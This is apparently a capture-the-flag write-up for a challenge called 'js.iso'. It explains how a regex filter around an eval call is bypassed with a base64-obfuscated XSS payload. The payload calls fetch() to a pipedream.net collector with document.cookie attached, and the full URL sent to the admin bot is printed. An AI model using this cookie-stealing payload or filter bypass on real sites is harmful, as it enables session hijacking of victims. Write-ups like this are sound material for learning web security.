# js.iso
### STAGE: LINUS TORVALDS

Here, checking the page source code, I noticed a "filter" that if bypassed allowed code injection within the page (using "eval"):

``` HTML
<script>
    var data = location.search.substr(1);

    data.split("/").join('');
    data = unescape(data);
    if (/([a-z]+\.|[a-z][A-Z]+\:|[a-z]+\=)/i.test(data)) { // >:(
        eval("result.innerHTML=''");
    } else {
        eval(`result.innerHTML='${data}'`); // we want to reach here!!!
    }
</script>
```
Our param "data" can be encoded to bypass the filter (if you want to know what it does, just search for RegExr), because we want to use `.` and `:`. So, our payload becomes: 
``` js
eval(atob(`ZmV0Y2goImh0dHBzOi8vZW42YXNidGhibnhhNi54LnBpcGVkcmVhbS5uZXQvIitkb2N1bWVudC5jb29raWUp`))
// this bypasses the filter
// encoded part = etch("https://en6asbthbnxa6.x.pipedream.net/"+document.cookie)
// "atob" converts base64 to string 
```

Sending to the admin this: `http://159.65.249.122:4111/?%27;eval(atob(%22ZmV0Y2goImh0dHBzOi8vZW42YXNidGhibnhhNi54LnBpcGVkcmVhbS5uZXQvIitkb2N1bWVudC5jb29raWUp%22))+%27` 
(`';eval(atob("ZmV0Y2goImh0dHBzOi8vZW42YXNidGhibnhhNi54LnBpcGVkcmVhbS5uZXQvIitkb2N1bWVudC5jb29raWUp"))+'`)
I got the flag :)

**Flag: `HACKAFLAG{Noth1n_h4rd_here}`**